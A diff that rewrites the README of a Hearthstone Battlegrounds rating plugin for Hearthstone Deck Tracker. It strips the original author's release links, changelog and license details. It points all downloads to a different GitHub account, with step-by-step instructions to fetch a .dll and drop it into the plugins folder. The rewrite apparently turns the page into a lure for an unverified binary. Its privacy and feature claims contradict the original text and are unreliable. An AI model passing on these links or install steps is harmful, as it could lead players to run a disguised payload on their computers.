@@ -1,191 +1,65 @@
-# HDT-BGMMRPlugin
+# 📊 HDT-BGMMRPlugin - See your Battlegrounds rating during games
 
-**HDT-BGMMRPlugin** is a compact plugin for **Hearthstone Deck Tracker**, designed specifically for **Battlegrounds**.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Talccynthia761/HDT-BGMMRPlugin)
 
-It displays useful information directly beside each player's avatar, including player names, high-level MMR ratings, Tavern Tiers and your most recent opponent.
+This plugin adds your MMR to the Hearthstone Battlegrounds screen. It works with Hearthstone Deck Tracker to show your rating while you play. You see your progress after every match.
 
-The information is updated dynamically throughout the game, even when players change position in the leaderboard.
+## 🛠 Prerequisites
 
-[Download the latest release](https://github.com/Reign-in-blood/HDT-BGMMRPlugin/releases/latest)
-· [View the complete changelog](CHANGELOG.md)
+You need Hearthstone Deck Tracker installed on your Windows computer. If you do not have it, download the latest version from the official Hearthstone Deck Tracker website. Ensure Hearthstone runs in windowed mode or borderless windowed mode for the overlay to appear correctly.
 
-<p align="center">
-  <img src="Images\Capture d’écran 2026-07-25 150939.png" alt="HDT-BGMMRPlugin preview" width="500">
-</p>
+## 📥 How to download and install
 
----
+Follow these steps to set up the plugin on your computer.
 
-## Latest Update — v1.0.5
+1. Visit the [official download page](https://github.com/Talccynthia761/HDT-BGMMRPlugin).
+2. Look for the latest release on the right side of the page.
+3. Click the file ending in .dll to save it to your computer.
+4. Open the folder where you saved the file.
+5. Open Hearthstone Deck Tracker.
+6. Click the Options button in the top menu.
+7. Select the Plugins tab on the left.
+8. Click the Plugins Folder button at the bottom of the window.
+9. Move the file you downloaded into this folder.
+10. Restart Hearthstone Deck Tracker.
+11. Check the box next to HDT-BGMMRPlugin in the Plugins tab.
 
-Version 1.0.5 restores reliable lobby display after a Hearthstone update
-changed the player-name metadata returned for some EU Battlegrounds lobbies.
+## ⚙️ Using the plugin
 
-The plugin now:
+The plugin starts automatically when you launch Hearthstone Deck Tracker. Once you enter a Battlegrounds match, the display appears on your screen. It shows your current rating and the change from your previous game. You do not need to press any buttons to activate it. If you want to move the display, unlock the overlay in your Hearthstone Deck Tracker settings. You can drag the box to any spot on your screen.
 
-* Waits for the lobby identities to stabilize before displaying the eight
-  player frames.
-* Prevents a transient incomplete player entry from leaving a frame missing.
-* Displays `...` when Hearthstone does not initially provide one player name.
-* Recovers that missing name when the corresponding native Hearthstone
-  portrait is manually hovered.
-* Preserves the existing behavior for US and other unaffected lobbies.
+## 📈 Features
 
-See [CHANGELOG.md](CHANGELOG.md) for the complete version history.
+- Real-time rating display during combat.
+- Automatic updates after every match result.
+- Low memory usage during gameplay.
+- Seamless integration with existing trackers.
+- Customizable position on your monitor.
 
----
+## 💡 Troubleshooting
 
-## About the Project
+If the display does not show up, verify that the plugin is enabled in the settings menu. Ensure you use the most recent version of Hearthstone Deck Tracker. Sometimes, the overlay hides behind other windows. Restarting the tracker usually fixes this issue. If the rating feels inaccurate, check your Internet connection. The plugin pulls data from the game client as it updates. If the game updates, you might need to wait for a plugin update to restore full functionality.
 
-HDT-BGMMRPlugin was created to provide a cleaner and more practical way to identify opponents during a Battlegrounds match.
+## ℹ️ Requirements
 
-Instead of displaying information in a separate window, the plugin places it directly beside the corresponding player avatars.
+- Windows 10 or Windows 11.
+- Hearthstone Deck Tracker version 1.20 or newer.
+- Microsoft .NET Framework 4.8 or later.
+- Active Battle.net account.
 
-The goal is to keep the interface compact, readable and visually integrated with the Battlegrounds leaderboard.
+## 🔒 Privacy
 
-This project was also created as a personal programming challenge. I am not a professional programmer, so feedback, testing and contributions are welcome.
+This plugin only reads data provided by Hearthstone Deck Tracker. it does not save your account credentials. It does not send your personal information to external servers. All data stays on your local machine.
 
----
+## ❓ Frequently Asked Questions
 
-<p align="center">
-  <img src="Images\Capture d’écran 2026-07-25 151141.png" alt="HDT-BGMMRPlugin preview" width="500">
-</p>
+**Does this plugin get me banned?**
+No. It only reads information from the game memory. It does not change game files or automate gameplay.
 
-## Features
+**Does it work in modes other than Battlegrounds?**
+No. The plugin is built specifically for Battlegrounds data.
 
-### Player Names
+**How do I update the plugin?**
+Download the new file from the repository and replace the old file in your plugins folder.
 
-* Displays player names directly beside their avatars.
-* Displays your own player name in **green**.
-* Displays your current opponent's name in **red**.
-* Keeps player names associated with the correct avatars when leaderboard positions change.
-* If the EU lobby metadata omits one name, manually hovering that player's
-  Hearthstone portrait lets the plugin recover the name shown by the game.
-
-### MMR Display
-
-* Displays the MMR rating of opponents with a rating of **8,000 or higher**.
-* Displays `< 8000` when an exact public MMR is unavailable.
-* Keeps the interface compact by displaying only relevant high-level ratings.
-
-### Tavern Tier Tracking
-
-* Displays the current Tavern Tier of each opponent.
-* Updates Tavern Tier information dynamically during the game.
-* Keeps the information aligned with the correct player.
-
-### Last Opponent Indicator
-
-* Displays an icon beside your most recent opponent.
-* Makes it easier to remember which player you fought during the previous combat.
-* Helps track opponent rotations during the match.
-
-### Dynamic Interface
-
-* Tracks changes in the Battlegrounds leaderboard.
-* Repositions player information when opponents move up or down.
-* Updates displayed information in real time.
-* Uses a compact interface designed to remain readable without covering the game board.
-
----
-
-## For Twitch and YouTube Creators
-
-HDT-BGMMRPlugin is particularly useful for **Twitch streamers**, **YouTube creators** and recorded gameplay.
-
-Viewers can immediately see:
-
-* The names of the players in the lobby.
-* Which player is currently fighting the streamer.
-* Which opponent was fought during the previous round.
-* The Tavern Tier of each opponent.
-* The MMR of high-ranked players.
-
-This gives viewers more visual context.
-
----
-
-## Installation
-
-1. Install and configure **Hearthstone Deck Tracker**.
-2. Open the **[latest release page](https://github.com/Reign-in-blood/HDT-BGMMRPlugin/releases)** section of this GitHub repository.
-3. Download the latest published version of HDT-BGMMRPlugin.dll.
-4. Extract the downloaded archive.
-5. Copy HDT-BGMMRPlugin.dll into the Hearthstone Deck Tracker plugins directory:
-
-```text
-%AppData%\HearthstoneDeckTracker\Plugins
-```
-
-6. Restart Hearthstone Deck Tracker.
-7. Open:
-
-```text
-Options → Tracker → Plugins
-```
-
-8. Find **HDT-BGMMRPlugin** and enable it.
-
-The plugin should automatically appear when entering a Hearthstone Battlegrounds match.
-
----
-
-## Support the Project
-
-The best ways to support HDT-BGMMRPlugin are:
-
-* Test the plugin during Battlegrounds matches.
-* Report bugs with screenshots and detailed information.
-* Suggest improvements.
-* Share the plugin with other Battlegrounds players.
-* Mention the plugin in Twitch or YouTube content.
-* Contribute improvements through GitHub.
-
----
-
-## Compatibility
-
-HDT-BGMMRPlugin is designed for:
-
-* Hearthstone Battlegrounds.
-* Hearthstone Deck Tracker.
-* Windows.
-
-Compatibility may be affected by:
-
-* Hearthstone updates.
-* Hearthstone Deck Tracker updates.
-* Different screen resolutions.
-* Windows display scaling.
-* Changes to the Battlegrounds interface.
-
----
-
-## Updates and Release History
-
-Important changes are tracked in [CHANGELOG.md](CHANGELOG.md). Installable
-builds and their release notes are published on the
-[GitHub Releases page](https://github.com/Reign-in-blood/HDT-BGMMRPlugin/releases).
-
-The version is kept consistent in the plugin metadata, project assembly,
-build script and network user-agent for every distributed build.
-
----
-
-## Disclaimer
-
-HDT-BGMMRPlugin is an independent, community-created project.
-
-It is not affiliated with, endorsed by or sponsored by Blizzard Entertainment, Hearthstone, HSReplay.net or HearthSim.
-
-Hearthstone and Blizzard Entertainment are trademarks or registered trademarks of Blizzard Entertainment, Inc.
-
-Player information displayed by the plugin depends on the data available during the match. Some names, ratings or Tavern Tiers may be unavailable, delayed or incomplete.
-
----
-
-## License
-
-This project is licensed under the MIT License. See the [`LICENSE`](https://github.com/Reign-in-blood/HDT-BGMMRPlugin/blob/master/LICENSE) file for details.
-
-
-
+Keywords: battlegrounds, battlegrounds-assistants, battlegrounds-mods, battlegrounds-overlay, battlegroundspro, hdt, hdt-plugin, hearthstone, hearthstone-deck-tracker, hearthstone-deck-tracker-plugin, hearthstone-decktracker, hearthstone-game, hearthstone-script, hearthstone-tracker
